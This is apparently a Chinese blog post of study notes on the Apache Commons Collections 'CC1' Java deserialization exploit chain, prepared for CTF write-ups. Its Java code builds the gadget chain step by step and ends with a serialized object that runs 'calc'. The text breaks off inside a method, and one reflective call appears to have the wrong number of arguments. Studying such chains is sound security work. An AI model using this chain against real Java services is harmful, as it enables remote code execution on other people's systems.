<!DOCTYPE html>
<html lang="en">
<style>
    p{
        margin-top: 0 !important;
        margin-bottom: 1rem !important;
        font-size: 1.1rem;
    }
    figure{
        margin: 0 !important;
    }
    pre{
        padding: 0 !important;
        margin-top: 0 !important;
        margin-bottom: 1rem !important;
    }

    td{
        padding: 0 !important;
        margin-bottom: 1rem !important;
    }
    h1,h2,h3,h4,h5,h6{
        margin-top: 0 !important;
        margin-bottom: 1rem !important;
    }
    @media (min-width: 1024px) {
        #middle-box{
            min-width: 56rem;
        }
    
    }
</style>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>向每个梦想加速 - CC1</title>
    <link rel="stylesheet" href="/css/styles.css">
    <link rel="stylesheet" href="/css/tailwind.css">
    <link rel="stylesheet" href="/css/highlight.css">
    <link rel="stylesheet" href="/css/toc.css">
    
<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
    <div class="container mx-auto flex items-center justify-between space-x-8">
    
      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
        <a href="/" class="hover:text-white transition-colors select-none">
          向每个梦想加速
        </a>
      </h1>
  
    <!-- 大屏幕 -->
      <nav class="hidden md:block">
        <ul class="flex space-x-6">
          
            <li>
              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Home
              </a>
            </li>
          
            <li>
              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Archives
              </a>
            </li>
          
            <li>
              <a href="/categories" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Categories
              </a>
            </li>
          
            <li>
              <a href="/tags" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Tags
              </a>
            </li>
          
            <li>
              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                About
              </a>
            </li>
          
        </ul>
      </nav>
  
      <!-- 小屏幕 -->
      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
        </svg>
      </button>
    </div>
  
    <!-- 折叠菜单 -->
    <nav id="mobile-menu" class="hidden bg-black">
      <ul class="space-y-2 py-4 px-6">
        
          <li>
            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
              Home
            </a>
          </li>
        
          <li>
            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
              Archives
            </a>
          </li>
        
          <li>
            <a href="/categories" class="block text-white hover:text-hacker-color1 transition-colors">
              Categories
            </a>
          </li>
        
          <li>
            <a href="/tags" class="block text-white hover:text-hacker-color1 transition-colors">
              Tags
            </a>
          </li>
        
          <li>
            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
              About
            </a>
          </li>
        
      </ul>
    </nav>
  
    <!-- RSS Link -->
    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
  </header>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="/js/search.js"></script>
  <script>
        document.addEventListener("DOMContentLoaded", () => {
    const menuToggle = document.getElementById("menu-toggle");
    const mobileMenu = document.getElementById("mobile-menu");

    menuToggle.addEventListener("click", () => {
        if (mobileMenu.classList.contains("hidden")) {
        mobileMenu.classList.remove("hidden");
        } else {
        mobileMenu.classList.add("hidden");
        }
    });
    });

  </script>


<meta name="generator" content="Hexo 7.3.0"></head>
<body class="bg-black text-hacker-color3 container mx-auto" style="overflow-x:hidden">
    <!-- 文章标题 -->
    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">CC1</h1>

    <!-- 发布时间 -->
    <p class="text-hacker-color3 text-center text-sm mb-4">
        2025-10-27
    </p>

    <!-- 文章内容 -->
    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight" style="display: flex;">
        <div id="middle-box">
            <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>涉及知识：Java反射、Java SE和Java EE</p>
<p>环境搭建可以看结尾参考的文章。</p>
<p>这里写篇CC只是为了记录一下Java题目，为后面的Wp做准备，所以除了WP不会写的太详细。</p>
<h1 id="思路代码更迭"><a href="#思路代码更迭" class="headerlink" title="思路代码更迭"></a>思路代码更迭</h1><p>具体操作步骤不附图了。有点麻烦。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Repeatable;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//原生弹calc</span></span><br><span class="line"><span class="comment">//            Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//            r.exec(&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//=========================================================</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射弹calc</span></span><br><span class="line">              <span class="comment">//part1:这里由于在Runtime类当中，Runtime类的构造器是私有（private）的</span></span><br><span class="line">              <span class="comment">//      所以要使用Runtime类的getRuntime获取实例。</span></span><br><span class="line"><span class="comment">//            Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);</span></span><br><span class="line"><span class="comment">//            Object o1 = c1.newInstance();</span></span><br><span class="line"><span class="comment">//            Method m1 = c1.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//            m1.invoke(c1,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">//part2:使用getRuntime正确获取实例。</span></span><br><span class="line"><span class="comment">//            Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);</span></span><br><span class="line"><span class="comment">//            Method getRuntimeMethod = c1.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line"><span class="comment">//            Object Runtime = getRuntimeMethod.invoke(c1);</span></span><br><span class="line"><span class="comment">//            Method m = c1.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//            m.invoke(Runtime,&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//==========================================================</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            在org.apache.commons.collections.Transformer;的Transformer当中有transform方法。</span></span><br><span class="line"><span class="comment">            ctrl+b查找那个类重写了transforme，发现InvokerTransformer类重写了。</span></span><br><span class="line"><span class="comment">            为什么要找这个类？因为这里使用反射执行了任意方法调用，类似后门。</span></span><br><span class="line"><span class="comment">            关键代码如下：</span></span><br><span class="line"><span class="comment">                Class cls = input.getClass();</span></span><br><span class="line"><span class="comment">                Method method = cls.getMethod(iMethodName, iParamTypes);</span></span><br><span class="line"><span class="comment">                return method.invoke(input, iArgs);</span></span><br><span class="line"><span class="comment">             向上查找发现有三个参数可控：</span></span><br><span class="line"><span class="comment">                public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span></span><br><span class="line"><span class="comment">                    super();</span></span><br><span class="line"><span class="comment">                    iMethodName = methodName;</span></span><br><span class="line"><span class="comment">                    iParamTypes = paramTypes;</span></span><br><span class="line"><span class="comment">                    iArgs = args;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="comment">//使用InvokerTransformer内的invoke弹calc。接下来ALT+F7查找谁有哪些同名transform方法</span></span><br><span class="line"><span class="comment">//            InvokerTransformer invokerTransformer = new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                    &quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                    new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                    new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//            invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line"><span class="comment">//==========================================================</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            查找到TransformedMap类下的checkSetValue方法当中调用了transform（优先查找在readObject方法下的）</span></span><br><span class="line"><span class="comment">            为什么查找transform？因为我们构造的链子是类似于重写，通过方法的重写得到最终的readObject</span></span><br><span class="line"><span class="comment">            关键代码：</span></span><br><span class="line"><span class="comment">                protected Object checkSetValue(Object value) &#123;</span></span><br><span class="line"><span class="comment">                    return valueTransformer.transform(value);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            1.我们既然要让他类似重写，那么我们将valueTransformer改为invockerTransformer。</span></span><br><span class="line"><span class="comment">            2.我们要调用checkSetValue并传参数Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">            先解决1，我们找valueTransformer的设置器</span></span><br><span class="line"><span class="comment">                protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span></span><br><span class="line"><span class="comment">                    super(map);</span></span><br><span class="line"><span class="comment">                    this.keyTransformer = keyTransformer;</span></span><br><span class="line"><span class="comment">                    this.valueTransformer = valueTransformer;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            我们可以调用TransformedMap对valueTransformer赋值，</span></span><br><span class="line"><span class="comment">            但是这个TransformedMap方法被protected修饰，那么他会被这个TransformedMap类内实例化，向上找TransformedMap</span></span><br><span class="line"><span class="comment">                public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span></span><br><span class="line"><span class="comment">                    return new TransformedMap(map, keyTransformer, valueTransformer);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            我们可以调用被public修饰的decorate方法给valueTransformer赋值，这会返回实例化一个TransformedMap方法，并且在之后会进行赋值。</span></span><br><span class="line"><span class="comment">            1.解决了，现在解决2.</span></span><br><span class="line"><span class="comment">            ALT+F7查找checkSetValue被谁调用，发现在AbstractInputCheckedMapDecorator方法当中的setValue方法内调用（这里是TransformedMap类extends了AbstractInputCheckedMapDecorator类，所以会调用这个类的setValue方法内的checkSetValue）</span></span><br><span class="line"><span class="comment">            这个setValue是被public修饰可以直接调用，那么怎样调用这个setvalue呢？</span></span><br><span class="line"><span class="comment">            MapEntry方法extends了AbstractMapEntryDecorator类，而AbstractMapEntryDecorator类implements了Map.Entry，所以，我们在进行Map遍历的时候就可以调用setValue并将参数传进去。</span></span><br><span class="line"><span class="comment">            由于最终AbstractMapEntryDecorator类当中setValue被调用时的参数类型是Object，所以我们Map也必须是Object类型</span></span><br><span class="line"><span class="comment">                public Object setValue(Object object) &#123;</span></span><br><span class="line"><span class="comment">                    return entry.setValue(object);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//            InvokerTransformer invokerTransformer = new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                    &quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                    new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                    new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">////            invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line"><span class="comment">//            Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//            HashedMap map = new HashedMap();</span></span><br><span class="line"><span class="comment">//            Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,invokerTransformer);</span></span><br><span class="line"><span class="comment">//            map.put(&quot;a&quot;,&quot;b&quot;);</span></span><br><span class="line"><span class="comment">//            for (Map.Entry&lt;Object,Object&gt; entry : transformedmap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">//                entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//==========================================================</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            ALT+F7查找哪些类内的方法与setValue重名（还是优先找readObject方法下）</span></span><br><span class="line"><span class="comment">            AnnotationInvocationHandler类下正好有readObject方法并调用了setValue，那么这里就是链子最终的地方。</span></span><br><span class="line"><span class="comment">            先弄序列化和反序列化方法进去。</span></span><br><span class="line"><span class="comment">            关键代码如下：</span></span><br><span class="line"><span class="comment">    private void readObject(java.io.ObjectInputStream s)</span></span><br><span class="line"><span class="comment">        throws java.io.IOException, ClassNotFoundException &#123;</span></span><br><span class="line"><span class="comment">        s.defaultReadObject();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        // Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        AnnotationType annotationType = null;</span></span><br><span class="line"><span class="comment">        try &#123;</span></span><br><span class="line"><span class="comment">            annotationType = AnnotationType.getInstance(type);</span></span><br><span class="line"><span class="comment">        &#125; catch(IllegalArgumentException e) &#123;</span></span><br><span class="line"><span class="comment">            // Class is no longer an annotation type; time to punch out</span></span><br><span class="line"><span class="comment">            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        // If there are annotation members without values, that</span></span><br><span class="line"><span class="comment">        // situation is handled by the invoke method.</span></span><br><span class="line"><span class="comment">        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">            String name = memberValue.getKey();</span></span><br><span class="line"><span class="comment">            Class&lt;?&gt; memberType = memberTypes.get(name);</span></span><br><span class="line"><span class="comment">            if (memberType != null) &#123;  // i.e. member still exists</span></span><br><span class="line"><span class="comment">                Object value = memberValue.getValue();</span></span><br><span class="line"><span class="comment">                if (!(memberType.isInstance(value) ||</span></span><br><span class="line"><span class="comment">                      value instanceof ExceptionProxy)) &#123;</span></span><br><span class="line"><span class="comment">                    memberValue.setValue(</span></span><br><span class="line"><span class="comment">                        new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line"><span class="comment">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span></span><br><span class="line"><span class="comment">                                annotationType.members().get(name)));</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">            这里发现setValue由内到外被if-if-for包裹，所以这里要满足两个if并且至少执行一次for循环。那么我们由外到内逐一解决。</span></span><br><span class="line"><span class="comment">                for要执行一次，那么memberValues不为null，向上找其构造器。</span></span><br><span class="line"><span class="comment">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span></span><br><span class="line"><span class="comment">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span></span><br><span class="line"><span class="comment">        if (!type.isAnnotation() ||</span></span><br><span class="line"><span class="comment">            superInterfaces.length != 1 ||</span></span><br><span class="line"><span class="comment">            superInterfaces[0] != java.lang.annotation.Annotation.class)</span></span><br><span class="line"><span class="comment">            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span></span><br><span class="line"><span class="comment">        this.type = type;</span></span><br><span class="line"><span class="comment">        this.memberValues = memberValues;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">            AnnotationInvocationHandler方法实现了memberValues赋值，我们可进行调用进行赋值，但是这个AnnotationInvocationHandler类没有被任何修饰符修饰，我们无法AnnotationInvocationHandler.AnnotationInvocationHandler(...)进行调用，只能在package sun.reflect.annotation;进行包内调用</span></span><br><span class="line"><span class="comment">            但是我们可以通过反射调用。</span></span><br><span class="line"><span class="comment">                参数memberValues弄好之后就是第一个if，memberType不为空即可进入，调试发现annotationType = AnnotationType.getInstance(type);     type:&quot;interface java.Lang.Override&quot;</span></span><br><span class="line"><span class="comment">            type:&quot;interface java.Lang.Override&quot;是我们传进去的Override.class，跟进发现public @interface Override &#123;&#125;为空，不可进入if，查找其他Annotation注解，Target、Retention、Repeatable都可以</span></span><br><span class="line"><span class="comment">                第二个if在调试的时候直接进入了</span></span><br><span class="line"><span class="comment">            if-if-for绕过之后执行，发现没有弹出calc，调试发现Runtime.getRuntime()没有被传进去，原因是在AnnotationInvocationHandler最后的setValue传进去的参数是固定的，我们无法控制，怎么办？凉拌炒鸡蛋</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//            InvokerTransformer invokerTransformer = new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                    &quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                    new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                    new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">////            invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line"><span class="comment">//            Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//            HashedMap map = new HashedMap();</span></span><br><span class="line"><span class="comment">//            Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,invokerTransformer);</span></span><br><span class="line"><span class="comment">//            map.put(&quot;value&quot;,&quot;b&quot;);</span></span><br><span class="line"><span class="comment">////            for (Map.Entry&lt;Object,Object&gt; entry : transformedmap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">////                entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">////            &#125;</span></span><br><span class="line"><span class="comment">//            Class c_AnnotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//            Constructor cons_AnnotationInvocationHandler = c_AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);</span></span><br><span class="line"><span class="comment">//            cons_AnnotationInvocationHandler.setAccessible(true);</span></span><br><span class="line"><span class="comment">//            Object o = cons_AnnotationInvocationHandler.newInstance(Retention.class, transformedmap);//其他文章用的Target注解，但是我发现Retention和Repeatable注解当中都有value，所以我采用了Retention</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            serialize(o);</span></span><br><span class="line"><span class="comment">//            unserialize(&quot;D:\\Download\\CC\\c1\\cc1.txt&quot;);</span></span><br><span class="line"><span class="comment">//==========================================================</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            在上一步的代码当中我们的参数会在AnnotationInvocationHandler类最后的setValue固定，导致我们在TransformedMap类的value不是Runtime.getRuntime().</span></span><br><span class="line"><span class="comment">            protected Object checkSetValue(Object value) &#123;</span></span><br><span class="line"><span class="comment">                    return valueTransformer.transform(value);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            如果有一种东西（这里称为x，x当中含有.transform(value2)），x.tansform(value)当中的tansform(value)没有用，value可以为任意东西，返回的是x当中的transform(value2),那不是同样可以调用invokerTransformer吗？</span></span><br><span class="line"><span class="comment">            这种东西确实存在就是ChainedTransformer类下的ChainedTransformer方法和transform方法</span></span><br><span class="line"><span class="comment">                        public class ChainedTransformer implements Transformer, Serializable &#123;</span></span><br><span class="line"><span class="comment">                            public ChainedTransformer(Transformer[] transformers) &#123;</span></span><br><span class="line"><span class="comment">                                super();</span></span><br><span class="line"><span class="comment">                                iTransformers = transformers;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                            public Object transform(Object object) &#123;</span></span><br><span class="line"><span class="comment">                                for (int i = 0; i &lt; iTransformers.length; i++) &#123;</span></span><br><span class="line"><span class="comment">                                    object = iTransformers[i].transform(object);</span></span><br><span class="line"><span class="comment">                                &#125;</span></span><br><span class="line"><span class="comment">                                return object;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"><span class="comment">//            Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//            ConstantTransformer constantTransformer = new ConstantTransformer(runtime);</span></span><br><span class="line"><span class="comment">//            InvokerTransformer invokerTransformer = new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                    &quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                    new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                    new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//            ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//                    constantTransformer,</span></span><br><span class="line"><span class="comment">//                    invokerTransformer</span></span><br><span class="line"><span class="comment">//            &#125;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            HashedMap map = new HashedMap();</span></span><br><span class="line"><span class="comment">//            Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,chainedTransformer);</span></span><br><span class="line"><span class="comment">//            map.put(&quot;value&quot;,&quot;b&quot;);</span></span><br><span class="line"><span class="comment">//            Class c_AnnotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//            Constructor cons_AnnotationInvocationHandler = c_AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);</span></span><br><span class="line"><span class="comment">//            cons_AnnotationInvocationHandler.setAccessible(true);</span></span><br><span class="line"><span class="comment">//            Object o = cons_AnnotationInvocationHandler.newInstance(Retention.class, transformedmap);//其他文章用的Target注解，但是我发现Retention和Repeatable注解当中都有value，所以我采用了Retention</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            serialize(o);</span></span><br><span class="line"><span class="comment">//            unserialize(&quot;D:\\Download\\CC\\c1\\cc1.txt&quot;);</span></span><br><span class="line"><span class="comment">//==========================================================</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            最后发现java.io.NotSerializableException: java.lang.Runtime</span></span><br><span class="line"><span class="comment">            Runtime无法被序列化，因为Runtime没有实现序列化接口，那么我们通过我们最上面写道Runtime反射调用calc的代码</span></span><br><span class="line"><span class="comment">                Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);</span></span><br><span class="line"><span class="comment">                Method getRuntimeMethod = c1.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line"><span class="comment">                Object Runtime = getRuntimeMethod.invoke(c1);</span></span><br><span class="line"><span class="comment">                Method m = c1.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">                m.invoke(Runtime,&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">            将其修改</span></span><br><span class="line"><span class="comment">            ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">                    constantTransformer,</span></span><br><span class="line"><span class="comment">                    invokerTransformer</span></span><br><span class="line"><span class="comment">            &#125;);</span></span><br><span class="line"><span class="comment">            为我们的反射Runtime调用calc的代码</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//            Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//            ConstantTransformer constantTransformer = new ConstantTransformer(runtime);</span></span><br><span class="line"><span class="comment">//            InvokerTransformer invokerTransformer = new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                    &quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                    new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                    new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">Runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(c1);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">            m.invoke(Runtime,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="comment">//                    constantTransformer,</span></span><br><span class="line"><span class="comment">//                    invokerTransformer</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="type">HashedMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashedMap</span>();</span><br><span class="line">            Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">            map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">c_AnnotationInvocationHandler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">cons_AnnotationInvocationHandler</span> <span class="operator">=</span> c_AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            cons_AnnotationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> cons_AnnotationInvocationHandler.newInstance(Retention.class, transformedmap);<span class="comment">//其他文章用的Target注解，但是我发现Retention和Repeatable注解当中都有value，所以我采用了Retention</span></span><br><span class="line"></span><br><span class="line">            serialize(o);</span><br><span class="line">            unserialize(<span class="string">&quot;D:\\Download\\CC\\c1\\cc1.txt&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:\\Download\\CC\\c1\\cc1.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义反序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        